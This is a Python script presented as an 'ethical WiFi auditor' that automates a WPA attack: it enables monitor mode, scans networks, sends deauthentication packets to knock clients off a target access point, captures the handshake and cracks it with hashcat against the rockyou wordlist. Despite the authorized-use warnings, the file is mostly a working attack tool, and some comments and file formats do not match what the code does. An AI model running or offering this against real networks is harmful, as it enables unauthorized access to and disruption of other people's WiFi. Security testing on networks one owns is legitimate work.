#!/usr/bin/env python3
import subprocess
import sys
import os
import argparse
from colorama import init, Fore, Style

# Initialize colorama for colored terminal output
init(autoreset=True)

class WiFiAuditor:
    """
    Ethical WiFi Auditor class.
    WARNING: For authorized testing and educational purposes only. Unauthorized use is illegal.
    """
    def __init__(self, interface):
        self.interface = interface
        self.mon_interface = f"{interface}mon"
        self.output_dir = "wifi_captures"
        os.makedirs(self.output_dir, exist_ok=True)

    def enable_monitor_mode(self):
        """Enable monitor mode on the specified interface."""
        try:
            subprocess.run(["airmon-ng", "start", self.interface], check=True, capture_output=True)
            print(f"{Fore.GREEN}✓ Monitor mode enabled: {self.mon_interface}")
        except subprocess.CalledProcessError as e:
            print(f"{Fore.RED}✗ Error enabling monitor mode: {e}")
            sys.exit(1)

    def scan_networks(self, duration=30):
        """Scan for nearby WiFi networks and save results as CSV."""
        output_file = os.path.join(self.output_dir, "scan_results")
        cmd = [
            "airodump-ng",
            self.mon_interface,
            "-w", output_file,
            "--output-format", "csv",
            "-u", str(duration)  # Update interval in seconds
        ]
        print(f"{Fore.YELLOW}Scanning for networks ({duration}s)... Press Ctrl+C to stop early.")
        try:
            subprocess.run(cmd, check=True, capture_output=True)
            print(f"{Fore.GREEN}✓ Scan saved to {output_file}-01.csv")
            return f"{output_file}-01.csv"
        except subprocess.CalledProcessError as e:
            print(f"{Fore.RED}✗ Scan error: {e}")
            return None

    def capture_handshake(self, bssid, channel, duration=60):
        """Capture WPA handshake for the target BSSID on the specified channel."""
        if not bssid or not channel:
            print(f"{Fore.RED}✗ BSSID and channel are required for capture.")
            return None
        cap_file = os.path.join(self.output_dir, f"handshake_{bssid.replace(':', '')}.cap")
        cmd = [
            "airodump-ng",
            "--bssid", bssid,
            "-c", str(channel),
            "-w", cap_file,
            self.mon_interface
        ]
        deauth_cmd = [
            "aireplay-ng",
            "--deauth", "10",  # Send 10 deauth packets
            "-a", bssid,
            self.mon_interface
        ]
        print(f"{Fore.YELLOW}Capturing handshake for {bssid} on channel {channel} ({duration}s)...")
        try:
            # Start capture in background
            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            # Wait 5 seconds, then send deauth packets
            subprocess.run(deauth_cmd, check=True, capture_output=True)
            # Continue capturing for the remaining duration
            proc.wait(timeout=duration)
            print(f"{Fore.GREEN}✓ Handshake capture saved to {cap_file}")
            return cap_file
        except subprocess.TimeoutExpired:
            proc.terminate()
            print(f"{Fore.YELLOW}Capture timed out after {duration}s.")
        except subprocess.CalledProcessError as e:
            print(f"{Fore.RED}✗ Capture error: {e}")
            if 'proc' in locals():
                proc.terminate()
            return None

    def crack_handshake(self, cap_file, wordlist="rockyou.txt"):
        """Convert capture to Hashcat format and attempt to crack the handshake."""
        if not os.path.exists(cap_file):
            print(f"{Fore.RED}✗ Capture file {cap_file} not found.")
            return
        if not os.path.exists(wordlist):
            print(f"{Fore.RED}✗ Wordlist {wordlist} not found. Download and unzip rockyou.txt.gz.")
            return
        hccapx_file = cap_file.replace(".cap", ".hccapx")
        convert_cmd = [
            "hcxpcapngtool",
            "-o", hccapx_file,
            cap_file
        ]
        crack_cmd = [
            "hashcat",
            "-m", "22000",  # WPA/WPA2 mode
            hccapx_file,
            wordlist,
            "-O"  # Optimized kernel
        ]
        try:
            subprocess.run(convert_cmd, check=True, capture_output=True)
            print(f"{Fore.GREEN}✓ Converted to Hashcat format: {hccapx_file}")
            print(f"{Fore.YELLOW}Cracking handshake... (This may take a while)")
            result = subprocess.run(crack_cmd, capture_output=True, text=True)
            if result.returncode == 0:
                print(f"{Fore.GREEN}✓ Crack successful! Output: {result.stdout.strip()}")
            else:
                print(f"{Fore.RED}✗ No password found or error: {result.stderr.strip()}")
        except subprocess.CalledProcessError as e:
            print(f"{Fore.RED}✗ Crack/convert error: {e}")

    def disable_monitor_mode(self):
        """Disable monitor mode and restore the interface."""
        try:
            subprocess.run(["airmon-ng", "stop", self.mon_interface], check=True, capture_output=True)
            print(f"{Fore.GREEN}✓ Monitor mode disabled.")
        except subprocess.CalledProcessError as e:
            print(f"{Fore.RED}✗ Error disabling monitor mode: {e}")

def main():
    parser = argparse.ArgumentParser(
        description="IzyWiFi: Ethical WiFi Auditor (Authorized Testing Only)",
        epilog="WARNING: Use only on networks you own or have explicit permission to test."
    )
    parser.add_argument("-i", "--interface", required=True, help="Wireless interface (e.g., wlan0)")
    parser.add_argument("-s", "--scan", action="store_true", help="Scan for nearby networks")
    parser.add_argument("-d", "--duration", type=int, default=30, help="Scan/capture duration in seconds (default: 30)")
    parser.add_argument("-c", "--capture", nargs=2, metavar=("BSSID", "CHANNEL"), help="Capture handshake (e.g., AA:BB:CC:DD:EE:FF 6)")
    parser.add_argument("-k", "--crack", help="Path to .cap file to crack")
    parser.add_argument("-w", "--wordlist", default="rockyou.txt", help="Path to wordlist (default: rockyou.txt)")

    args = parser.parse_args()

    auditor = WiFiAuditor(args.interface)
    auditor.enable_monitor_mode()

    try:
        if args.scan:
            auditor.scan_networks(duration=args.duration)
        elif args.capture:
            bssid, channel = args.capture
            cap = auditor.capture_handshake(bssid, channel, duration=args.duration)
            if cap and args.crack:  # If --crack is also provided, crack immediately
                auditor.crack_handshake(cap, args.wordlist)
        elif args.crack:
            auditor.crack_handshake(args.crack, args.wordlist)
        else:
            parser.print_help()
    finally:
        auditor.disable_monitor_mode()

if __name__ == "__main__":
    main()
